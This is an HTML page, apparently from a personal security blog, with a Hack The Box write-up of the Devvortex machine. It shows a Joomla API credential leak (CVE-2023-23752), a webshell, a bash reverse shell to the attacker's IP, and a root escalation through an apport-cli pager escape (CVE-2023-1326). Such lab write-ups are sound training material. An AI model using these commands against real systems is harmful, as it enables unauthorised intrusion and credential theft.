@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Devvortex // Lab Report // crimson</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="../favicon.svg">
+<link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+
+<div class="grid-bg"></div>
+<div class="glow"></div>
+<div class="crt-overlay" aria-hidden="true"></div>
+
+<header class="site">
+  <nav>
+    <div class="logo glitch">~/<span>crimson</span>▋</div>
+    <div class="navlinks">
+      <a href="../index.html">Home</a>
+      <a href="../blog.html">Blog</a>
+      <a href="../reports.html" class="active">Lab Reports</a>
+      <a href="../methodology.html">Methodology</a>
+      <a href="../projects.html">Projects</a>
+      <a href="../aboutme.html">About Me</a>
+    </div>
+    <div class="nav-status"><span class="status-dot"></span>online</div>
+  </nav>
+</header>
+
+<main>
+
+  <section class="page-head reveal visible" style="border-bottom:none;padding-bottom:0;">
+    <a href="../reports.html" class="back-link">← ls reports/</a>
+    <div class="eyebrow scramble">cat devvortex.md</div>
+    <h1 class="page-title scramble glitch glow-heading">Devvortex</h1>
+    <div class="writeup-meta">
+      <span class="tag">HTB</span><span class="tag diff easy">Easy</span><span class="tag">Enumeration</span><span class="tag">API</span><span class="tag">Web</span><span class="tag">Linux PrivEsc</span>
+    </div>
+    <p class="writeup-summary">Devvortex is an easy Linux machine running Joomla 4.2.6. An exposed Joomla API endpoint discloses database credentials, which provide administrative access to Joomla and allow a malicious webshell extension to be installed. Database enumeration then reveals credentials for the logan user, while a sudo permission for apport-cli provides the final path to root.</p>
+    <div class="writeup-date">Solved: August 30, 2026</div>
+  </section>
+
+  <section class="reveal visible">
+    <div class="writeup-body">
+      <h2>Recon</h2>
+      <p>Started with a basic Nmap scan:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">nmap</div></div><div class="term-body"><div><span class="prompt">$</span> nmap -sCV -Pn 10.129.229.146</div></div></div>
+      <p>The scan identified two accessible services:</p>
+      <table class="writeup-table"><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22</td><td>SSH</td><td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.9</td></tr><tr><td>80</td><td>HTTP</td><td>nginx 1.18.0 (Ubuntu)</td></tr></tbody></table>
+      <p>The HTTP service redirected to:</p>
+      <div class="output-block">http://devvortex.htb/</div>
+      <p>We added the hostname to <code>/etc/hosts</code>:</p>
+      <div class="output-block">10.129.229.146 devvortex.htb</div>
+      <h2>Enumeration</h2>
+      <h3>HTTP - TCP 80</h3>
+      <p>The main website did not reveal much useful information.</p>
+      <p>We performed directory enumeration:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">ffuf</div></div><div class="term-body"><div><span class="prompt">$</span> ffuf -u http://devvortex.htb/FUZZ \</div><div><span class="prompt">$</span> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</div></div></div>
+      <p>The results mainly contained static resources:</p>
+      <div class="output-block">js
+css
+images</div>
+      <p>Since the main site did not expose much, we moved on to subdomain enumeration.</p>
+      <h3>Subdomain Enumeration</h3>
+      <p>We fuzzed for virtual hosts/subdomains and discovered:</p>
+      <div class="output-block">dev.devvortex.htb</div>
+      <p>We added it to <code>/etc/hosts</code>:</p>
+      <div class="output-block">10.129.229.146 dev.devvortex.htb</div>
+      <p>The development site was significantly more interesting.</p>
+      <p>Running <code>whatweb</code> identified the application:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">whatweb</div></div><div class="term-body"><div><span class="prompt">$</span> whatweb http://dev.devvortex.htb</div></div></div>
+      <p>The response identified a site named <code>Devvortex</code> running behind nginx.</p>
+      <p>We then performed directory enumeration against the development subdomain:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">ffuf</div></div><div class="term-body"><div><span class="prompt">$</span> ffuf -u http://dev.devvortex.htb/FUZZ \</div><div><span class="prompt">$</span> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \</div><div><span class="prompt">$</span> -fc 302</div></div></div>
+      <p>Several Joomla directories were discovered:</p>
+      <div class="output-block">modules
+includes
+tmp
+templates
+cache
+libraries
+plugins
+components
+administrator
+media
+language
+api
+home
+layouts</div>
+      <p>The <code>/administrator</code> directory immediately stood out.</p>
+      <h3>Joomla</h3>
+      <p>Navigating to:</p>
+      <div class="output-block">http://dev.devvortex.htb/administrator</div>
+      <p>revealed a Joomla administrator login page.</p>
+      <p>We identified the Joomla version by requesting its manifest:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">curl</div></div><div class="term-body"><div><span class="prompt">$</span> curl -s http://dev.devvortex.htb/administrator/manifests/files/joomla.xml | grep -i version</div></div></div>
+      <p>The response showed:</p>
+      <div class="output-block">&lt;version&gt;4.2.6&lt;/version&gt;</div>
+      <p>The target was therefore running <span class="hl">Joomla 4.2.6</span>.</p>
+      <p>Joomla 4.2.6 is affected by <span class="hl">CVE-2023-23752</span>, an information-disclosure vulnerability that can expose configuration information through the Joomla API.</p>
+      <p>An initial attempt to use a public exploit did not immediately work, so instead we manually investigated the API.</p>
+      <h3>Joomla API</h3>
+      <p>The <code>/api</code> directory discovered earlier suggested that the Joomla API was accessible.</p>
+      <p>We requested the public application configuration endpoint:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">curl</div></div><div class="term-body"><div><span class="prompt">$</span> curl -v 'http://dev.devvortex.htb/api/index.php/v1/config/application?public=true'</div></div></div>
+      <p>The response exposed database configuration information:</p>
+      <div class="output-block">"dbtype":"mysqli"
+"host":"localhost"
+"user":"lewis"
+"password":"P4ntherg0t1n5r3c0n##"
+"db":"joomla"
+"dbprefix":"sd4fg_"</div>
+      <p>The API therefore disclosed valid database credentials:</p>
+      <div class="output-block">lewis:P4ntherg0t1n5r3c0n##</div>
+      <p>The same vulnerability is the information-disclosure path documented for Devvortex.</p>
+      <h2>Initial Access</h2>
+      <p>The leaked credentials provided access to the Joomla administrator account:</p>
+      <div class="output-block">Username: lewis
+Password: P4ntherg0t1n5r3c0n##</div>
+      <p>After logging into the Joomla administrator panel, we needed a way to execute commands on the underlying server.</p>
+      <p>Rather than modifying the existing Joomla template, we used a malicious Joomla webshell extension.</p>
+      <p>The extension could be installed through the Joomla administrator interface and provided a PHP webshell.</p>
+      <p>After installation, the webshell was accessible at:</p>
+      <div class="output-block">/modules/mod_webshell/mod_webshell.php</div>
+      <p>We tested command execution with:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">curl</div></div><div class="term-body"><div><span class="prompt">$</span> curl 'http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php?action=exec&amp;cmd=id'</div></div></div>
+      <p>This confirmed that we could execute commands on the server.</p>
+      <p>We then used the webshell to establish a reverse shell.</p>
+      <p>On our attacking machine:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">nc</div></div><div class="term-body"><div><span class="prompt">$</span> nc -lvnp 4444</div></div></div>
+      <p>From the webshell:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">bash</div></div><div class="term-body"><div><span class="prompt">$</span> bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.15.232/4444 0&gt;&amp;1'</div></div></div>
+      <p>This provided an interactive shell on the target.</p>
+      <h3>Database Enumeration</h3>
+      <p>The credentials obtained from the Joomla API were also valid for the local MySQL database.</p>
+      <p>We connected to MySQL:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">mysql</div></div><div class="term-body"><div><span class="prompt">$</span> mysql -u lewis -p'P4ntherg0t1n5r3c0n##' -h localhost -D joomla</div></div></div>
+      <p>We then enumerated the Joomla users:</p>
+      <div class="output-block">SELECT id, username, email, password FROM sd4fg_users;</div>
+      <p>The database contained two users:</p>
+      <div class="output-block">+-----+----------+---------------------+--------------------------------------------------------------+
+| id  | username | email               | password                                                     |
++-----+----------+---------------------+--------------------------------------------------------------+
+| 649 | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
+| 650 | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
++-----+----------+---------------------+--------------------------------------------------------------+</div>
+      <p>The <code>logan</code> password hash was recoverable, giving us:</p>
+      <div class="output-block">logan:tequieromucho</div>
+      <h2>Privilege Escalation</h2>
+      <p>With valid credentials for <code>logan</code>, we could SSH into the machine:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">ssh</div></div><div class="term-body"><div><span class="prompt">$</span> ssh logan@10.129.229.146</div></div></div>
+      <p>We then checked the user's sudo permissions:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">sudo</div></div><div class="term-body"><div><span class="prompt">$</span> sudo -l</div></div></div>
+      <p>The important result was:</p>
+      <div class="output-block">User logan may run the following commands on devvortex:
+    (ALL : ALL) /usr/bin/apport-cli</div>
+      <p>This meant <code>logan</code> could execute <code>apport-cli</code> as <code>root</code>.</p>
+      <p>We checked its version:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">apport-cli</div></div><div class="term-body"><div><span class="prompt">$</span> apport-cli --version</div></div></div>
+      <div class="output-block">2.20.11</div>
+      <p>This version of <code>apport-cli</code> is affected by <span class="hl">CVE-2023-1326</span>. The vulnerability involves the program invoking a pager while retaining elevated privileges, allowing a shell escape from the pager.</p>
+      <h2>Root</h2>
+      <p>We triggered <code>apport-cli</code> with:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">sudo</div></div><div class="term-body"><div><span class="prompt">$</span> sudo apport-cli -f</div></div></div>
+      <p>We navigated through the report-generation prompts until the report was displayed.</p>
+      <p>The report viewer uses a pager. From the viewer, we used the shell escape:</p>
+      <div class="output-block">!/bin/bash</div>
+      <p>This spawned a shell with the privileges inherited from the <code>sudo</code>-executed <code>apport-cli</code>.</p>
+      <p>We verified our privileges:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">id</div></div><div class="term-body"><div><span class="prompt">$</span> id</div></div></div>
+      <p>The resulting shell was running as <code>root</code>.</p>
+      <p>We then retrieved the root flag:</p>
+      <div class="cmd-block term-card"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><div class="term-title">cat</div></div><div class="term-body"><div><span class="prompt">$</span> cat /root/root.txt</div></div></div>
+      <div class="output-block">9faa19853df18567c5fdae3ffeee420f</div>
+      <p>The machine was fully compromised.</p>
+      <h2>Key Takeaways</h2>
+      <ul class="takeaway-list"><li><span class="hl">Enumerate subdomains when the main website gives you little information.</span> The <code>dev.devvortex.htb</code> subdomain exposed the actual Joomla application.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Always identify the exact CMS version.</span> Joomla 4.2.6 pointed toward CVE-2023-23752.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Investigate APIs carefully.</span> The Joomla API exposed database credentials without requiring authentication.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Reuse discovered credentials carefully.</span> The leaked <code>lewis</code> credentials provided database access and administrative access to Joomla.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Enumerate databases after obtaining application credentials.</span> The Joomla user table contained a password hash for <code>logan</code>, leading to SSH access.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Always run <code>sudo -l</code>.</span> The <code>logan</code> account could execute <code>apport-cli</code> as root.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Check versions of privileged binaries.</span> <code>apport-cli 2.20.11</code> was vulnerable to CVE-2023-1326.</li></ul>
+      <ul class="takeaway-list"><li><span class="hl">Understand what a privileged program does.</span> The pager used by <code>apport-cli</code> provided a shell escape, resulting in root access.</li></ul>
+    </div>
+  </section>
+
+</main>
+
+<footer class="site" style="padding-top:0;">
+  <div class="foot-bottom" style="max-width:1100px;margin:0 auto;padding:24px;border-top:1px solid var(--border);">
+    <div>crimson © 2026</div>
+    <div><a href="../reports.html" style="color:var(--text-dim);">← back to Lab Reports</a></div>
+  </div>
+</footer>
+
+<script src="../script.js"></script>
+</body>
+</html>
